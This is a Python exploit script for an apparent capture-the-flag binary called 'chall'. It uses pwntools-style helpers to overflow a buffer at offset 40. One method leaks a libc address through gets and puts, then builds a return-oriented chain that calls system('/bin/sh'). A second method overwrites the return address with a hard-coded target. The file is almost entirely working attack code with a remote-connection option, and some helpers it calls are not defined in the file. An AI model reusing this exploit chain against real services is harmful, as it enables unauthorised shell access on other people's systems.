#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''   

        b *vuln+31
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def method1():

    pl = flat({

        offset: [
        
            exe.plt["gets"],
            exe.plt["gets"],
            exe.plt["puts"],
            exe.sym["main"]
        ]

    })

    sl(pl)

    sl(p32(0) + b"A"*4 + b"B"*8)
    sl(b"CCCC")

    rb(8)

    leak = u64(p.recv(6) + b"\x00\x00")
    libc.address = leak + 0x28c0
    print(hex(leak))
    print(hex(libc.address))

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1


    pl = flat({

        offset: [

            pop_rdi,
            next(libc.search(b'/bin/sh\0')),
            ret,
            libc.sym.system
        ]

    })

    sl(pl)

def method2():

    pl = b'A'*offset + p64(0x0000000000401331) + p64(exe.sym.__dl_relocate_static_pie)

    sl(pl)

def exploit():

    global offset 

    offset = 40
    method2()

    interactive()

if __name__ == '__main__':
  exploit()
